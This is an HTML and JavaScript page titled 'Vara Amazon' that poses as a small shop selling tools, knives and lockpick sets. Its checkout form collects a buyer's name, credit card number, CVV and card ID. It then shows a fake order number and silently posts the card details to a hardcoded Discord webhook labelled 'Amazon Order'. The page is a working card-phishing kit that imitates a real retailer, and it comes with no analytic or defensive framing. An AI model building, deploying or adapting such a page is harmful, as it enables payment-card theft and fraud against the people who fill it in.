<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vara Amazon</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c2c2c;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        h1 {
            margin-bottom: 20px;
            font-size: 2.5em;
            color: #f4f4f4;
        }

        #search-bar {
            width: 80%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .category-btn {
            padding: 15px 30px;
            font-size: 1.2em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .category-btn:hover {
            background-color: #0056b3;
        }

        .items {
            margin-top: 20px;
        }

        .item-btn {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            padding: 10px 20px;
            font-size: 1.1em;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .item-btn:hover {
            background-color: #218838;
        }

        .form-container {
            text-align: left;
            width: 300px;
            margin: 0 auto;
        }

        .form-container label {
            display: block;
            margin: 10px 0 5px;
        }

        .form-container input[type="text"], .form-container textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 1.2em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Vara Amazon</h1>
        <input type="text" id="search-bar" placeholder="Search for a category...">
        <div class="buttons">
            <button class="category-btn" onclick="showCategory('tools')">Tools</button>
            <button class="category-btn" onclick="showCategory('food')" style="display:none;">Food</button>
            <button class="category-btn" onclick="showCategory('more')" style="display:none;">More</button>
        </div>
        <div id="items" class="items"></div>
    </div>

    <script>
        function showCategory(category) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            const tools = [
                "Bolt cutters", 
                "Lockpick sets", 
                "Padlocks", 
                "Axes", 
                "Knives", 
                "Shovels", 
                "Hoes"
            ];

            let items = [];

            if (category === 'tools') {
                items = tools;
            }

            items.forEach(item => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.textContent = item;
                button.onclick = () => showItemVariants(item);
                itemsDiv.appendChild(button);
            });
        }

        function showItemVariants(item) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            let variants = [];

            switch (item) {
                case 'Shovels':
                    variants = [
                        { name: "Basic Shovel", price: 25 },
                        { name: "Heavy-Duty Shovel", price: 40 }
                    ];
                    break;
                case 'Hoes':
                    variants = [
                        { name: "Garden Hoe", price: 35 },
                        { name: "Heavy-Duty Hoe", price: 45 }
                    ];
                    break;
                case 'Knives':
                    variants = [
                        { name: "Pocket Knife", price: 100 },
                        { name: "Hunting Knife", price: 60 },
                        { name: "Utility Knife", price: 45 }
                    ];
                    break;
                case 'Lockpick sets':
                    variants = [
                        { name: "Beginner Lockpick Set", price: 70 },
                        { name: "Professional Lockpick Set", price: 100 },
                        { name: "Advanced Lockpick Set", price: 150 }
                    ];
                    break;
                default:
                    variants = [{ name: item, price: 'N/A' }];
            }

            variants.forEach(variant => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.innerHTML = variant.price === 'N/A' ? variant.name : `${variant.name} <span>$${variant.price}</span>`;
                button.onclick = () => goToCustomerForm(variant);
                itemsDiv.appendChild(button);
            });
        }

        function goToCustomerForm(item) {
            document.body.innerHTML = `
                <div class="container">
                    <h1>Enter Your Details for ${item.name}${item.price !== 'N/A' ? ` ($${item.price})` : ''}</h1>
                    <div class="form-container">
                        <label for="name">Name:</label>
                        <input type="text" id="name" placeholder="Your Name">

                        <label for="bank-details">Bank Account Details:</label>
                        <textarea id="bank-details" rows="4" placeholder="Credit card number:\nCC/V:\nCC ID:"></textarea>

                        <button class="submit-btn" onclick="submitOrder('${item.name}', '${item.price}')">Buy</button>
                    </div>
                </div>
            `;
        }

        function submitOrder(item, price) {
            const name = document.getElementById('name').value;
            const bankDetails = document.getElementById('bank-details').value;

            if (name && bankDetails) {
                const orderNumber = Math.floor(Math.random() * 1000000);
                alert(`thank you for purcashing  ${item}${price !== 'N/A' ? ` ($${price})` : ''}! Your order number is #${orderNumber}.`);

                // Send webhook with details as an embed to Discord
                fetch('https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [
                            {
                                title: "New Order",
                                color: 3066993,
                                fields: [
                                    {
                                        name: "Order Num:",
                                        value: `#${orderNumber}`
                                    },
                                    {
                                        name: "Item:",
                                        value: `${item}${price !== 'N/A' ? ` ($${price})` : ''}`
                                    },
                                    {
                                        name: "Customer name:",
                                        value: name
                                    },
                                    {
                                        name: "Bank Account Details:",
                                        value: `\`\`\`${bankDetails}\`\`\``
                                    }
                                ],
                                footer: {
                                    text: "Amazon Order"
                                },
                                timestamp: new Date()
                            }
                        ]
                    })
                }).then(response => console.log('Webhook sent:', response));
            } else {
                alert('Please fill in all the fields.');
            }
        }

        // Implement search functionality
        document.getElementById('search-bar').addEventListener('input', function() {
            const query = this.value.toLowerCase();
            const buttons = document.querySelectorAll('.category-btn');

            buttons.forEach(button => {
                if (button.textContent.toLowerCase().includes(query)) {
                    button.style.display = '';
                } else {
                    button.style.display = 'none';
                }
            });
        });
    </script>
</body>
</html>
